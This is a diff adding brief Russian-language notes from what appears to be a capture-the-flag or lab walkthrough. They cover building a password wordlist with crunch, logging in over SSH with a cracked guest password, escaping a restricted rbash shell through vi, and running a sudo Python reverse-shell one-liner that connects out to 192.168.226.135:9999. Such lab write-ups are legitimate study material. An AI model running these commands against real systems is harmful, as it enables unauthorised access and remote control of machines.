@@ -1,0 +1,15 @@
+нужно составить словарь слов k1ll0rXX   и вместо XX нужно было вставить 2 символа, буква-цифра-спец символ
+я сама составляла словарь на питоне, но как позже посмотрела в прохождение сущ специальная утилита, 
+    crunch 8 8 -t k1ll0r%@ -o dict.txt
+
+далее после подключения по ssh guest:k1ll0r7n я столкнулась с другой проблемой
+ограничение дейтсвий пользователя Restricted Shell, -rbash
+
+я посмотрела как ее обходить с помощью редактора vi, все остальные способы не работали
+    :!/bin/bash
+   <in-console>export PATH=/usr/bin:$PATH 
+дальше просто, нам доступны все права
+и я просто выполняю команду
+    sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.226.135",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
